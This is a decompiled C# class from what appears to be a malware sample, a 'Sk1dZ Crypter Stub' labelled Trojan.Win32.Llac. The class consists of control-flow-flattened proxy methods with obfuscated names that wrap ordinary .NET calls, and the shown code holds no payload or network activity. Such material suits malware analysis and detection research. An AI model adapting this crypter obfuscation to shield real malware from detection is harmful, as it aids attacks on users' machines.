// Decompiled with JetBrains decompiler
// Type: Sk1dZ__Crypter_Stub.My.MyComputer
// Assembly: Sk1dZ™ Crypter Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 765DE0A6-3ADE-4E57-B9F8-38E417A60863
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.corb-c03a55dcfef9171c3c7a521e3f6aa3cd6873dbf8e0e0c6041a02f9ac6f9bd531.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Sk1dZ__Crypter_Stub.My
{
  [GeneratedCode("MyTemplate", "10.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class MyComputer : Computer
  {
    [EditorBrowsable(EditorBrowsableState.Never)]
    public MyComputer()
    {
    }

    [SecuritySafeCritical]
    static MyComputer() => Ⴈ.Ⴓ.ႣႼ();

    [SecuritySafeCritical]
    internal static Assembly Ⴍ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 123:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 3:
            goto label_8;
          case 4:
          case 7:
            num2 = 0;
            continue;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴍ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.Assembly;
    }

    [SecuritySafeCritical]
    internal static void Ⴅ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
            goto label_7;
          case 3:
            goto label_9;
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 93:
                num2 = 1;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.Name = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴃ([In] int[] obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_7;
          case 4:
            goto label_8;
          case 5:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 24:
                num2 = 0;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      FileSystem.FileClose(obj0);
    }

    [SecuritySafeCritical]
    internal static string Ⴓ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 45:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 5:
            goto label_3;
          case 1:
            num2 = 4;
            continue;
          case 3:
          case 6:
            goto label_8;
          case 7:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴓ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.Substring(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static char[] Ⴐ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 53:
          num1 = 0;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 7:
            goto label_8;
          case 1:
            num2 = 3;
            continue;
          case 3:
          case 6:
            goto label_3;
          case 4:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴐ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.ToCharArray();
    }

    [SecuritySafeCritical]
    internal static int Ⴀ([In] char obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 76:
          num1 = 0;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 1:
          case 3:
          case 4:
          case 6:
            goto label_3;
          case 5:
            num2 = 1;
            continue;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴀ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return Strings.Asc(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴗ([In] XElement obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 3:
            num1 = 5;
            continue;
          case 2:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 110:
                num2 = 2;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Value = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴈ([In] XElement obj0, [In] XName obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            num1 = 3;
            continue;
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 75:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.SetAttributeValue(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static void Ⴄ([In] XObject obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 2;
            continue;
          case 3:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 13:
                num2 = 3;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.AddAnnotation(obj1);
    }

    [SecuritySafeCritical]
    internal static bool Ⴜ([In] XAttribute obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 24:
          num1 = 4;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 4:
          case 7:
            goto label_8;
          case 3:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴜ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.IsNamespaceDeclaration;
    }

    [SecuritySafeCritical]
    internal static Assembly ႥႭ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 1:
          num1 = 7;
          break;
        case 2:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            num2 = 5;
            continue;
          case 1:
            num2 = 5;
            continue;
          case 4:
          case 8:
            goto label_10;
          case 5:
            goto label_3;
          case 6:
          case 7:
            goto label_9;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.ႥႭ);
            num2 = 5;
            continue;
        }
      }
label_9:
      return Assembly.GetExecutingAssembly();
label_10:
      return Assembly.GetExecutingAssembly();
    }

    [SecuritySafeCritical]
    internal static int ႥႥ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_3:
      int num1;
      switch (obj5 ^ obj4)
      {
        case 65:
          num1 = 2;
          break;
        case 66:
          num1 = 8;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_3;
          case 1:
          case 2:
            goto label_9;
          case 4:
            num2 = 5;
            continue;
          case 6:
            num2 = 5;
            continue;
          case 8:
            goto label_10;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.ႥႥ);
            num2 = 5;
            continue;
        }
      }
label_9:
      return obj0.Read(obj1, obj2, obj3);
label_10:
      return obj0.Read(obj1, obj2, obj3);
    }

    [SecuritySafeCritical]
    internal static byte[] ႥႣ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 92:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
          case 5:
            goto label_3;
          case 2:
          case 7:
            goto label_8;
          case 4:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.ႥႣ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.ToArray();
    }

    [SecuritySafeCritical]
    internal static void ႥႳ([In] Hashtable obj0, [In] object obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 2:
            goto label_8;
          case 3:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 93:
                num2 = 0;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Add(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static void ႥႰ([In] bool obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 4:
            goto label_7;
          case 3:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 77:
                num2 = 1;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Application.SetCompatibleTextRenderingDefault(obj0);
    }
  }
}
